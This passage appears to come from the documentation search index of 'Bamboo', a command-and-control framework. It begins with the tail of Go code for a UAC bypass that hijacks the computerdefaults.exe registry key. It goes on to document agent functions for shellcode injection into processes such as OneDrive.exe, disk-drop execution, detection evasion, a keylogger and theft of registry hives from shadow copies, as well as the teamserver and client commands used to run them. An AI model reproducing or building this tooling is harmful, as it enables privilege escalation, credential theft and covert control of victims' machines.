HKCU\\\\%s\\\\DelegateExecute\\n\", keyPath)\n\n    if err := setRegistryValue(registry.CURRENT_USER, keyPath, \"\", payloadLocation); err != nil {\n        fmt.Printf(\"Error setting registry value: %v\\n\", err)\n        return\n    }\n    fmt.Printf(\"Successfully set registry value: HKCU\\\\%s (Default)\\n\", keyPath)\n\n    // Launch computerdefaults.exe\n    cmd := exec.Command(\"cmd\", \"/C\", \"start computerdefaults.exe\")\n    err := cmd.Start()\n    if err != nil {\n        fmt.Printf(\"Error starting computerdefaults.exe: %v\\n\", err)\n        return\n    }\n    fmt.Println(\"Successfully started computerdefaults.exe\")\n\n}\n\n// Function to set a registry value\nfunc setRegistryValue(root registry.Key, keyPath, valueName, value string) error {\nk, \\_, err := registry.CreateKey(root, keyPath, registry.SET_VALUE)\nif err != nil {\nreturn fmt.Errorf(\"error creating or opening registry key: %v\", err)\n}\ndefer k.Close()\n\n    if err := k.SetStringValue(valueName, value); err != nil {\n        return fmt.Errorf(\"error setting registry value: %v\", err)\n    }\n\n    return nil\n\n}\n</code></pre>"},{"location":"exploits.html#custom-exploits","title":"Custom Exploits","text":"<p>Bamboo is designed to allow users to add their own exploits to the tool. Exploits can be added via the Bamboo Client. View the user guide for more details. </p>"},{"location":"global_variables.html","title":"Global Variables","text":"<p>Global variables are used in Bamboo Teamserver and Bamboo Client GUI. A global variable is typically used to store and share information across different parts of the application. This helps maintain consistent states or configurations that need to be accessible from multiple components.</p>"},{"location":"global_variables.html#global-variables-bamboo-teamserver","title":"Global Variables - Bamboo Teamserver","text":"Variable Type Description Usage ws_handler Dictionary Whenever a Bamboo Client logs in and connects via a WebSocket, Bamboo Teamserver will record the username as the key and the WebSocket as the value Enables Bamboo Teamserver to broadcast messages to all connected Bamboo Clients ws_agent Dictionary Whenever a Bamboo Agent connects via WebSocket, Bamboo Teamserver will record its agent identifier as the key and the WebSocket as the value Enables Bamboo Teamserver to broadcast commands agent_response Dictionary For the <code>cmd</code> command, Bamboo Agent's response is recorded in this dictionary Enables Bamboo Client to receive the response keylog_status Dictionary For the <code>postexp keylog</code> command, Bamboo Teamserver will record down the status of each Bamboo Agent keylog process (start/stop) Determines if Bamboo Client is starting or stopping a keylog process"},{"location":"global_variables.html#global-variables-bamboo-client-gui","title":"Global Variables - Bamboo Client GUI","text":"Variable Type Description Usage jwt_token String Stores the JSON Web Token (JWT) in a global variable Enables Bamboo Client GUI to access the JWT when needed ws_process String Stores the WebSocket process Enables Bamboo Client GUI to terminate the WebSocket process easily"},{"location":"Agent_Structure/agent-connect-c2_api.html","title":"agent/connect/c2_api","text":"<p>The packege that exports functions used to interact with the Teamserver via HTTP APIs</p>"},{"location":"Agent_Structure/agent-connect-c2_api.html#c2-connection-functions","title":"C2 Connection Functions","text":""},{"location":"Agent_Structure/agent-connect-c2_api.html#c2_http","title":"C2_http","text":"<p>Make a request to the Teamserver's HTTP APIs</p> <p>Parameters</p> Parameter Type Description url string Address of the server in format ip:port endpoint string The resource to connect to on the Teamserver method string The HTTP RESTful method to use (GET, POST) message any Map of body to send to Teamserver <p>Return</p> Type Description map[string]any Server response error Error from request if any"},{"location":"Agent_Structure/agent-connect-c2_api.html#getfile","title":"GetFile","text":"<p>Download file from Teamserver (at /agent/download/&lt;filename&gt;)</p> <p>Parameters</p> Parameter Type Description url string Address of the server in format ip:port filename string Name of file to download <p>Return</p> Type Description []byte File in bytes slice error Error from request if any"},{"location":"Agent_Structure/agent-connect-c2_api.html#data-parsing-functions","title":"Data Parsing Functions","text":"<p>These functions are not exported but rather used by C2_http to handle the request and response body. </p>"},{"location":"Agent_Structure/agent-connect-c2_api.html#datatohttpbody","title":"dataToHttpBody","text":"<p>Convert from map variable into io.Reader that can be used with the http package</p> <p>Parameters</p> Parameter Type Description data any Map of body to convert to send <p>Return</p> Type Description io.Reader Reader interface to be used by http error Error from request if any"},{"location":"Agent_Structure/agent-connect-c2_api.html#httpbodytodata","title":"httpBodyToData","text":"<p>Download file from Teamserver (at /agent/download/&lt;filename&gt;)</p> <p>Parameters</p> Parameter Type Description http_body io.ReadCloser Reader returned by http response <p>Return</p> Type Description map[string]any Map response data error Error from request if any"},{"location":"Agent_Structure/agent-connect-websocket.html","title":"agent/connect/websocket","text":"<p>The packege that exports functions used to connect and communicate with the Teamserver over WebSocket</p>"},{"location":"Agent_Structure/agent-connect-websocket.html#websocket-functions","title":"WebSocket functions","text":""},{"location":"Agent_Structure/agent-connect-websocket.html#send_data","title":"Send_data","text":"<p>Send data through a established Websocket connection</p> <p>Parameters</p> Parameter Type Description conn *websocket.Conn Pointer to Websocket connection object message map[string]any Message to send <p>Return</p> Type Description error Error from Websocket if any"},{"location":"Agent_Structure/agent-connect-websocket.html#receive_data","title":"Receive_data","text":"<p>Listen to messages from Teamserver over Websocket</p> <p>Parameters</p> Parameter Type Description conn *websocket.Conn Pointer to Websocket connection object <p>Return</p> Type Description message map[string]any error Error from Websocket if any"},{"location":"Agent_Structure/agent-connect-websocket.html#init_conn","title":"Init_conn","text":"<p>Initialize Websocket connection with the Teamserver</p> <p>Parameters</p> Parameter Type Description c2_url string Address of the server in format ip:port agent_id string Agent identifier issued by Teamserver <p>Return</p> Type Description conn *websocket.Conn error Error from Websocket if any"},{"location":"Agent_Structure/agent-exploit.html","title":"agent/exploit","text":"<p>The package used to run exploits, either by injection or dropping and running from disk</p>"},{"location":"Agent_Structure/agent-exploit.html#file-functions","title":"File Functions","text":""},{"location":"Agent_Structure/agent-exploit.html#dropfile","title":"DropFile","text":"<p>Write a file from a variable to the disk</p> Parameter Type Description exe []byte The contents of the file filename string Name of file to use <p>Return</p> Type Description error Error created if any"},{"location":"Agent_Structure/agent-exploit.html#deleteexefile","title":"DeleteExeFile","text":"<p>Deletes a file (usually an executable) from disk. This function will first try to rename it to a placeholder name that does not have the .exe extension before deleting to evade the Process Termination followed by Deletion rule.</p> Parameter Type Description filename string Name of file to delete <p>Return</p> Type Description error Error created if any"},{"location":"Agent_Structure/agent-exploit.html#droptodisk","title":"DropToDisk","text":"<p>Uses the DropFile function to create a file and execute it with a shell. </p> Parameter Type Description exe []byte The contents of the file <p>Return</p> Type Description error Error created if any"},{"location":"Agent_Structure/agent-exploit.html#injection-functions","title":"Injection Functions","text":""},{"location":"Agent_Structure/agent-exploit.html#virturalalloc","title":"VirturalAlloc","text":"<p>Performs Virtural Allocation injection. For more information, refer to </p> Parameter Type Description payload string Hex string of shellcode to run <p>Return</p> Type Description error Error created if any"},{"location":"Agent_Structure/agent-exploit.html#remotethreadinjection","title":"RemoteThreadInjection","text":"<p>Performs Remote Thread injection in OneDrive.exe. For more information, refer to </p> Parameter Type Description payload string Hex string of shellcode to run <p>Return</p> Type Description error Error created if any"},{"location":"Agent_Structure/agent-exploit.html#ntdllgadgetinjection","title":"NtDllGadgetInjection","text":"<p>Performs NtQueueApcThreadEx NTDLL Gadget Injection. For more information, refer to </p> Parameter Type Description payload string Hex string of shellcode to run <p>Return</p> Type Description error Error created if any"},{"location":"Agent_Structure/agent-post_exploit.html","title":"agent/post-exploit","text":"<p>Package for the functions to perform system enumeration and post exploitation. For more details on how they work, refer to</p>"},{"location":"Agent_Structure/agent-post_exploit.html#enumeration-function","title":"Enumeration function","text":""},{"location":"Agent_Structure/agent-post_exploit.html#powershellcsv","title":"powershellCsv","text":"<p>Run a command in powershell</p> <p>Parameters</p> Parameter Type Description command string Command to run <p>Return</p> Type Description string Output of command error Error from command if any"},{"location":"Agent_Structure/agent-post_exploit.html#enumeratesystem","title":"EnumerateSystem","text":"<p>Uses powershellCsv to run specific commands for enumerating the host system  </p> <ul> <li>System Information  </li> <li>Updates installed  </li> <li>Applications installed</li> </ul> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description map[string]string Result of command error Error from command if any"},{"location":"Agent_Structure/agent-post_exploit.html#keylogger","title":"Keylogger","text":""},{"location":"Agent_Structure/agent-post_exploit.html#hookkeylog","title":"hookKeylog","text":"<p>Listens and records keys entered</p> <p>Parameters</p> Parameter Type Description evChan chan hook.Event Listens to keyboard activity <p>Return</p> <p>None</p>"},{"location":"Agent_Structure/agent-post_exploit.html#runkeylogger","title":"RunKeylogger","text":"<p>Starts the keylogging function, and listens for a stop command to stop and transfer logged keys</p> <p>Parameters</p> Parameter Type Description keystrokesChan chan string Channel out of function which returns keys logged stopChan chan bool Channel into function to instruct it to stop <p>Return</p> <p>None</p>"},{"location":"Agent_Structure/agent-post_exploit.html#retrieve-registry-hives-sssretrieve","title":"Retrieve Registry Hives (sssretrieve)","text":""},{"location":"Agent_Structure/agent-post_exploit.html#getlatestshadowcopy","title":"getLatestShadowCopy","text":"<p>Get the latest shadow copy volume</p> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description string The latest shadow copy volume error Error from command if any"},{"location":"Agent_Structure/agent-post_exploit.html#readfile","title":"readFile","text":"<p>Read the contents of a file</p> <p>Parameters</p> Parameter Type Description sourceFile string Path of file to read <p>Return</p> Type Description []byte Contents of file error Error created if any"},{"location":"Agent_Structure/agent-post_exploit.html#readfilesfromshadowcopy","title":"readFilesFromShadowCopy","text":"<p>Read the contents of the registry hives (sam, security, system) given the shadow copy </p> <p>Parameters</p> Parameter Type Description shadowCopyVolume string Location of latest shadow copy <p>Return</p> Type Description map[string][]byte Contents of files error Error created if any"},{"location":"Agent_Structure/agent-post_exploit.html#sssretriver","title":"SSSRetriver","text":"<p>Runs the registry hive retriver function, by using the functions above </p> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description map[string][]byte Contents of files error Error created if any"},{"location":"Agent_Structure/agent.html","title":"agent","text":"<p>The main package for the agent </p>"},{"location":"Agent_Structure/agent.html#global-variables","title":"Global Variables","text":"Parameter Type Description Default Value DEFAULT_TEAMSERVER_IP string Default IP address to query Teamserver, declared with a go:embed directive The value in default-ip.txt TEAMSERVER_URL string Used to store the full address of the Teamserver, in format ip:port SKIP_PRIV bool Used to store whether the -skip-priv parameter was used keylogHandler string Used to store which handler started the keylogging keyloggingStatus bool Indicate whether the keylogger is currently running or not false keystrokesChan chan string Used by the keylogging function to send back the keys captured stopChan chan bool Used to send a true value to the keylogging function to return the function"},{"location":"Agent_Structure/agent.html#functions","title":"Functions","text":""},{"location":"Agent_Structure/agent.html#setglobalvars","title":"setGlobalVars","text":"<p>Used to set global variables from the command line arguments</p> <p>Parameters</p> <p>None</p> <p>Return</p> <p>None</p>"},{"location":"Agent_Structure/agent.html#executecommand","title":"executeCommand","text":"<p>Run a command in the command prompt</p> <p>Parameters</p> Parameter Type Description command string Command to run <p>Return</p> Type Description string Output of command error Error from command if any"},{"location":"Agent_Structure/agent.html#splitcsvstring","title":"splitCsvString","text":"<p>Split a line of string from a CSV formatted input and return as a slice</p> <p>Parameters</p> Parameter Type Description csvstr string CSV formatted string <p>Return</p> Type Description []string Slice of string"},{"location":"Agent_Structure/agent.html#getprivilgelevel","title":"getPrivilgeLevel","text":"<p>Get the user and privilege level the agent is running as</p> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description string Integrity level string Username"},{"location":"Agent_Structure/agent.html#hostinfo","title":"hostInfo","text":"<p>Get host information such as - hostname - privateIP - publicIP - integrity - user</p> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description map[string]any Map of host information"},{"location":"Agent_Structure/agent.html#init_conn","title":"init_conn","text":"<p>Connect and register with the Teamserver via HTTPS API</p> <p>Parameters</p> Parameter Type Description host_info map[string]any Map of host information <p>Return</p> Type Description string Agent identifier issued by Teamserver"},{"location":"Agent_Structure/agent.html#heartbeat","title":"heartbeat","text":"<p>An infinite loop to send the Teamserver heartbeats every 5-10 seconds. Ran in a goroutine</p> <p>Parameters</p> Parameter Type Description agent_identifier string Agent identifier issued by Teamserver <p>Return</p> <p>None</p>"},{"location":"Agent_Structure/agent.html#runexploits","title":"runExploits","text":"<p>Switch case and logic to select how to run the exploit and executes it</p> <p>Parameters</p> Parameter Type Description message map[string]any Message sent from Teamserver <p>Return</p> Type Description error Error from running exploit if any"},{"location":"Agent_Structure/agent.html#runpostexploit","title":"runPostExploit","text":"<p>Switch case and logic to run a post exploit function or enumeration</p> <p>Parameters</p> Parameter Type Description message map[string]any Message sent from Teamserver priv string Integrity level of agent <p>Return</p> Type Description map[string]any Map of data to send back to the Teamserver string Teamserver URL to send result to error Error from running functions if any"},{"location":"Agent_Structure/agent.html#menu","title":"menu","text":"<p>Listen for a Websocket message and carry out its command</p> <p>Parameters</p> Parameter Type Description ws_conn *websocket.Conn Pointer to Websocket connection object agent_identifier string Agent identifier issued by Teamserver priv string Integrity level of agent <p>Return</p> <p>None</p>"},{"location":"Agent_Structure/agent.html#domanyprint","title":"DoManyPrint","text":"<p>Prints a string many times, each ended with a carriage return (\\r). Used in an attempt to evade detection. </p> Parameter Type Description text string The string to print <p>Return</p> Type Description int The number 8"},{"location":"Agent_Structure/overview.html","title":"Overview","text":"<p>This section of the document will list the functions used in the agent and global variables declared, broken down by the packages used. </p> <p>Below is the file structure of the Bamboo Agent </p> Text Only<pre><code>agent\n\u251c\u2500\u2500 connect\n\u2502   \u251c\u2500\u2500 c2_api\n\u2502   \u2502   \u251c\u2500\u2500 c2_api.go \n\u2502   \u251c\u2500\u2500 websocket\n|   |   \u251c\u2500\u2500 websocket.go\n\u251c\u2500\u2500 exploit\n\u2502   \u251c\u2500\u2500 embed\n\u2502   \u2502   \u251c\u2500\u2500 ntqueueapcthreadex.exe\n\u2502   \u251c\u2500\u2500 disk-drop.go\n\u2502   \u251c\u2500\u2500 inject.go\n\u251c\u2500\u2500 post_exploit\n\u2502   \u251c\u2500\u2500 enumerate.go\n\u2502   \u251c\u2500\u2500 keylogger.go\n\u2502   \u251c\u2500\u2500 sssretrieve.go\n\u251c\u2500\u2500 agent.go\n\u251c\u2500\u2500 default-ip.txt\n\u251c\u2500\u2500 go.mod\n\u251c\u2500\u2500 go.sum\n\u2514\u2500\u2500 helper.go\n</code></pre>"},{"location":"Client/commands.html","title":"Commands","text":"<p>This is not a user guide, this is the documentation for Bamboo Client Commands. Bamboo Client offers a wide variety of commands in both CLI and GUI interface. This enables users to interact with Bamboo Teamserver, Bamboo Agent, and even other Bamboo Client users. The table below contains all the commands that Bamboo offers. The commands below are mainly for the CLI and may defer in the GUI. Use the <code>help</code> command see the difference in the GUI.</p> Command Description <code>help</code> Displays command list <code>exit</code>/<code>quit</code> Exit handler <code>chat</code> Send/Receive message in team chat <code>clear</code> Clear chat logs <code>users</code> Display all handler information <code>register</code> Add in a new handler <code>remove [handler]</code> Remove handler from DB <code>display</code> Display all agent information <code>use [agent]</code> Start using an agent <code>kill [agent]</code> Remove agent from DB <code>exp</code> View all exploits in DB <code>add</code> Add exploit to DB (CLI cannot upload file) <code>delete [exploit]</code> Remove exploit from DB <code>modify [exploit]</code> Modify exploit in DB <p>When Handler is Using an Agent with <code>use</code></p> Command Description <code>stop</code> Stop using agent <code>info</code> Displays information of current agent <code>exploit</code> Run specific exploit in agent <code>cmd</code> Run commands in agent <code>enum</code> Enumerate victim machine <code>postexp [method]</code> Run post exploit"},{"location":"Client/commands.html#help","title":"help","text":"<p>Show the help menu that lists all commands and descriptions.</p> CLI Command GUI Command Command <code>help</code> <code>help</code> Null"},{"location":"Client/commands.html#exitquit","title":"exit/quit","text":"<p>Exit Bamboo Client.</p> CLI Command GUI Command Command <code>exit/quit</code> <code>exit/quit</code> auth.logout"},{"location":"Client/commands.html#chat","title":"chat","text":"<p>Open team chat to send/receive chat messages from other Bamboo Clients.</p> CLI Command GUI Command Command <code>chat</code> TEAMCHAT tab TeamChatReaderWriter.run_chat"},{"location":"Client/commands.html#clear","title":"clear","text":"<p>Clear chat messages.</p> CLI Command GUI Command Command <code>clear</code> <code>clear</code> TeamChatReaderWriter.clearchat"},{"location":"Client/commands.html#users","title":"users","text":"<p>Display all users with their status.</p> CLI Command GUI Command Command <code>users</code> <code>users</code>/dropdown menu handler_func.view_users"},{"location":"Client/commands.html#register","title":"register","text":"<p>Register a new user into the database.</p> CLI Command GUI Command Command <code>register --username [username] --pw [password]</code> <code>register</code>/dropdown menu handler_func.register_user"},{"location":"Client/commands.html#remove","title":"remove","text":"<p>Remove a handler from the database.</p> CLI Command GUI Command Command <code>remove [handler]</code> <code>remove [handler]</code> handler_func.delete_user"},{"location":"Client/commands.html#display","title":"display","text":"<p>Display all agent information.</p> CLI Command GUI Command Command <code>display</code> <code>display</code>/dropdown menu handler_func.display"},{"location":"Client/commands.html#use","title":"use","text":"<p>Start using an agent.</p> CLI Command GUI Command Command <code>use [agent]</code> <code>use [agent]</code> handler_func.use_agent"},{"location":"Client/commands.html#kill","title":"kill","text":"<p>Kill an agent and remove it from the database.</p> CLI Command GUI Command Command <code>kill [agent]</code> <code>kill [agent]</code>/dropdown menu handler_func.remove_agent"},{"location":"Client/commands.html#exp","title":"exp","text":"<p>View all exploits in the database.</p> CLI Command GUI Command Command <code>exp</code> <code>exp</code>/dropdown menu exploits.view_exploits"},{"location":"Client/commands.html#add","title":"add","text":"<p>Add an exploit into the database.</p> CLI Command GUI Command Command <code>add</code> <code>add</code>/dropdown menu exploit.add_exploit"},{"location":"Client/commands.html#delete","title":"delete","text":"<p>Delete an exploit from the database.</p> CLI Command GUI Command Command <code>delete [exploit]</code> <code>delete [exploit]</code>/dropdown menu exploit.del_exploit"},{"location":"Client/commands.html#modify","title":"modify","text":"<p>Modify an exploit in the database.</p> CLI Command GUI Command Command <code>modify [exploit]</code> <code>modify</code>/dropdown menu exploit.modify <p>When the Client is Using an Agent with <code>use</code></p>"},{"location":"Client/commands.html#stop","title":"stop","text":"<p>Stop using the agent.</p> CLI Command GUI Command Command <code>stop</code> <code>stop</code> handler_func.stop_agent"},{"location":"Client/commands.html#info","title":"info","text":"<p>Display information of the current agent.</p> CLI Command GUI Command Command <code>info</code> <code>info</code> handler_func.info_status"},{"location":"Client/commands.html#exploit","title":"exploit","text":"<p>Command the agent to run an exploit.</p> CLI Command GUI Command Command <code>exploit</code> <code>exploit</code> commands.exploit_process"},{"location":"Client/commands.html#cmd","title":"cmd","text":"<p>Run commands in the agent.</p> CLI Command GUI Command Command <code>cmd</code> <code>cmd</code> commands.command_prompt"},{"location":"Client/commands.html#enum","title":"enum","text":"<p>Enumerate the agent machine.</p> CLI Command GUI Command Command <code>enum</code> <code>enum</code>/buttons commands.enum"},{"location":"Client/commands.html#postexp","title":"postexp","text":"<p>Run a post exploit.</p> CLI Command GUI Command Command <code>postexp [method]</code> <code>postexp [method]</code>/buttons commands.postexp"},{"location":"Client/gui_commands.html","title":"GUI Commands","text":"<p>This is not a user guide, this is the documentation for GUI Commands. GUI Commands are a set of classes that works between the commands and the Bamboo Client GUI. As Bamboo Client GUI was built on top of Bamboo Client CLI, the GUI will invoke the functions in /handler/gui/commands first. The functions located in there will then invoke the functions in /handler/commands to request for specific APIs from Bamboo Teamserver and will then return messages accordingly. The additional step is required to ensure that the statements are printed in the GUI itself instead of the terminal running in the background. However, there are some cases where the CLI does not require a certain action, or an entire new command needs to be created as the command is only suited for the CLI. When this happens, GUI Commands will directly call the server endpoint instead.</p> <p>GUI Commands are split into 5 different classes that were grouped together according to their use cases and domains. To find out more about each command, click on the command or visit the Commands page.</p> Class Description agent_commands Commands that involves Agents exploit_commands Commands that involves Exploits general_commands General commands postexp_commands Commands that involves Post Exploits user_commands Commands that involves Users"},{"location":"Client/gui_commands.html#agent_commands","title":"agent_commands","text":"Functions GUI Command Command Called Arguments display_agent <code>display</code> handler_func.display Null use_agent <code>use [agent]</code> handler_func.use_agent agent_identifier remove_agent <code>kill [agent]</code> handler_func.remove_agent agent_identifier stop_agent <code>stop</code> handler_func.stop_agent agent_in_use info_status <code>info</code> handler_func.info_status agent_in_use checkStatus <code>exploit</code>, <code>cmd</code>, <code>postexp</code> func.check_agent_status agent_in_use cmd <code>cmd</code> commands.command_prompt agent_identifier, cmd"},{"location":"Client/gui_commands.html#exploit_commands","title":"exploit_commands","text":"Functions GUI Command Command Called Arguments display_exploit <code>exp</code> exploits.view_exploits Null delete_exploit <code>delete [exploit]</code> exploits.del_exploit exploit_name gather_exploits <code>modify</code>, <code>exploit</code> Endpoint: /exploit/view_all jwt_token stop_process <code>exploit</code> Endpoint: /exploit/quit agent_identifier send_exploit_config <code>exploit</code> Endpoint: /exploit/send_config need_donut, agent_identifier, exploit_to_use, evasion_method, app_version, uac_bypass, donut_config, donot_for add_exploit <code>add</code> Endpoint: /exploit/add exploit_path, exploit_name, app_version, LPE_start, LPE_end, uac_bypass, d2d, inj, dropfile modify_exploit <code>modify</code> Endpoint: /exploit/modify_gui modified_exploit_name, new_name, new_app_version, new_LPE_start, new_LPE_end, new_uac_bypass, new_d2d, new_inj, new_dropfile"},{"location":"Client/gui_commands.html#general_commands","title":"general_commands","text":"Functions GUI Command Command Called Arguments show_help <code>help</code> Null Null exiting <code>exit</code>/<code>quit</code> Null Null clear <code>clear</code> Null Null"},{"location":"Client/gui_commands.html#postexp_commands","title":"postexp_commands","text":"Functions GUI Command Command Called Arguments enum <code>enum</code> commands.enum agent_identifier, priv_lvl postexp_gui <code>postexp [method]</code> commands.postexp agent_identifier, method, priv_lvl"},{"location":"Client/gui_commands.html#user_commands","title":"user_commands","text":"Functions GUI Command Command Called Arguments show_users <code>users</code> handler_func.view_users Null register_user <code>register</code> handler_func.register_user new_user, new_pw delete_user <code>remove [handler]</code> handler_func.delete_user del_username"},{"location":"Client/Command_Classes/command_auth.html","title":"Command Class - <code>auth</code>","text":"<p>The auth class provides methods to interact with a server for user authentication and agent status management. It facilitates operations such as checking server availability, user login, user logout, and checking the status of agents. Each method in the class is designed to communicate with specific endpoints of the server API, handling tasks related to user authentication and session management.</p> <p></p>"},{"location":"Client/Command_Classes/command_auth.html#check","title":"check","text":"<p>Determines if the server is online</p>"},{"location":"Client/Command_Classes/command_auth.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>GET /auth/\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#function-argument","title":"Function argument","text":"<p>This function does not require any argument</p>"},{"location":"Client/Command_Classes/command_auth.html#description","title":"Description","text":"<p>This function attempts to connect to the server by sending a GET request to the <code>/auth/</code> endpoint. If the connection is successful, it returns \"success.\" If the server cannot be reached, it prints an error message and returns \"failed.\"</p>"},{"location":"Client/Command_Classes/command_auth.html#_1","title":"Command Class - auth","text":""},{"location":"Client/Command_Classes/command_auth.html#function-return","title":"Function return","text":"Field Type Description Status String Indicates whether the connection to the server was successful."},{"location":"Client/Command_Classes/command_auth.html#authentication","title":"authentication","text":"<p>Authenticates the user</p>"},{"location":"Client/Command_Classes/command_auth.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /auth/login\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#description_1","title":"Description","text":"<p>This function sends a POST request to the <code>/auth/login</code> endpoint with the provided username and password. If the credentials are correct, the server returns a JSON response containing the login status and a JWT token. The function returns the login status and the JWT token if available.</p>"},{"location":"Client/Command_Classes/command_auth.html#function-argument_1","title":"Function argument","text":"Field Type Description username String Username of user password String Password of user"},{"location":"Client/Command_Classes/command_auth.html#arguments-example","title":"Arguments Example","text":"Text Only<pre><code>authentication(\"bambooUser\", \"adnap\")\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#function-return_1","title":"Function return","text":"Field Type Description Status String Status of login jwt_token String JWT token for authentication"},{"location":"Client/Command_Classes/command_auth.html#logout","title":"logout","text":"<p>Logs out the user</p>"},{"location":"Client/Command_Classes/command_auth.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /auth/logout\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#description_2","title":"Description","text":"<p>This function sends a POST request to the <code>/auth/logout</code> endpoint with the provided username. If the server responds with a status code of 200, it prints a message indicating that the user has exited the server.</p>"},{"location":"Client/Command_Classes/command_auth.html#function-argument_2","title":"Function argument","text":"Field Type Description username String Username of user jwt_token String JWT token for authentication"},{"location":"Client/Command_Classes/command_auth.html#arguments-example_1","title":"Arguments Example","text":"Text Only<pre><code>logout(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#function-return_2","title":"Function Return","text":"<p>The function does not return anything</p> <p></p>"},{"location":"Client/Command_Classes/command_auth.html#check_agent_status","title":"check_agent_status","text":"<p>Checks the status of an agent.</p>"},{"location":"Client/Command_Classes/command_auth.html#endpoint_3","title":"Endpoint","text":"Text Only<pre><code>POST /auth/check_agent_status\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#description_3","title":"Description","text":"<p>This function sends a POST request to the <code>/auth/check_agent_status</code> endpoint with the provided username and agent identifier. The server responds with the status of the agent, which is returned as a JSON object.</p>"},{"location":"Client/Command_Classes/command_auth.html#function-argument_3","title":"Function argument","text":"Field Type Description username String Username of user agent_identifier String Identifier for the agent jwt_token String JWT token for authentication"},{"location":"Client/Command_Classes/command_auth.html#arguments-example_2","title":"Arguments Example","text":"Text Only<pre><code>check_agent_status(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#function-return_3","title":"Function return","text":"Field Type Description response String Status of Agent"},{"location":"Client/Command_Classes/command_cmd.html","title":"Command Class - <code>commands</code>","text":"<p>The commands class provides methods for interacting with an agent through various server endpoints. This includes processes like exploiting an agent, sending commands, enumerating system information, and performing post-exploitation activities.</p> <p></p>"},{"location":"Client/Command_Classes/command_cmd.html#exploit_process","title":"exploit_process","text":"<p>Starts an exploit process on the specified agent.</p>"},{"location":"Client/Command_Classes/command_cmd.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/quit\nPOST /exploit/view_all\nPOST /exploit/send_config\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#description","title":"Description","text":"<p>This function first retrieves all available exploits from Bamboo Teamserver using the <code>/exploit/view_all</code> endpoint. The user will select an exploit, and start start configuring it. This function is dynamic in a way that only shows what can be choosen to the user. As different exploits have different configurations, each exploit configuration steps may be different. If during the configuration, the user wants to stop the process, the <code>/exploit/quit</code> endpoint will be called for logging purposes. The <code>/exploit/send_config</code> endpoint will be called to proceed once the user confirms the exploitation.</p>"},{"location":"Client/Command_Classes/command_cmd.html#function-argument","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_cmd.html#arguments-example","title":"Arguments Example","text":"Text Only<pre><code>exploit_process(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#function-return","title":"Function Return","text":"Field Type Description Status String Status of the exploit process initiation"},{"location":"Client/Command_Classes/command_cmd.html#command_prompt","title":"command_prompt","text":"<p>Sends a command to the agent and retrieves the output.</p>"},{"location":"Client/Command_Classes/command_cmd.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/cmd\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#description_1","title":"Description","text":"<p>This function will send the command input by the user and then continuously checks for the response until it is received or a timeout occurs.</p>"},{"location":"Client/Command_Classes/command_cmd.html#function-argument_1","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent cmd String Command to be executed on the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_cmd.html#arguments-example_1","title":"Arguments Example","text":"Text Only<pre><code>command_prompt(\"bambooUser\", \"5zrire9a\", \"whoami\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#function-return_1","title":"Function Return","text":"Field Type Description Output String Output from the command executed on the agent"},{"location":"Client/Command_Classes/command_cmd.html#enum","title":"enum","text":"<p>Enumerates information about the infected machine.</p>"},{"location":"Client/Command_Classes/command_cmd.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /postexp/enum\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#description_2","title":"Description","text":"<p>This method requests the enumeration of an infected machine and indicates that the result is back and can be viewed.</p>"},{"location":"Client/Command_Classes/command_cmd.html#function-argument_2","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent priv_lvl String Privilege level for the enumeration jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_cmd.html#arguments-example_2","title":"Arguments Example","text":"Text Only<pre><code>enum(\"bambooUser\", \"5zrire9a\", \"High\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#function-return_2","title":"Function Return","text":"Field Type Description Status String Status of the enumeration request"},{"location":"Client/Command_Classes/command_cmd.html#postexp","title":"postexp","text":"<p>Command post exploitation tools provided</p>"},{"location":"Client/Command_Classes/command_cmd.html#endpoint_3","title":"Endpoint","text":"Text Only<pre><code>POST /postexp/{method}\n\nPOST /postexp/keylog\nPOST /postexp/retrieve\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#description_3","title":"Description","text":"<p>This function will send the command to the Bamboo Agent and depending on the method (keylog/retrieve), there will be different outputs. SSS_Retrieve can only be used if the Bamboo Agent privilege is \"High\" or \"System\"</p>"},{"location":"Client/Command_Classes/command_cmd.html#function-argument_3","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent method String Post-exploitation method to be executed priv_lvl String Privilege level for the post-exploitation jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_cmd.html#arguments-example_3","title":"Arguments Example","text":"Text Only<pre><code>postexp(\"bambooUser\", \"5zrire9a\", \"keylog\", \"Medium\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#function-return_3","title":"Function Return","text":"Field Type Description Status String Status of the post-exploitation action"},{"location":"Client/Command_Classes/command_exploit.html","title":"Command Class - 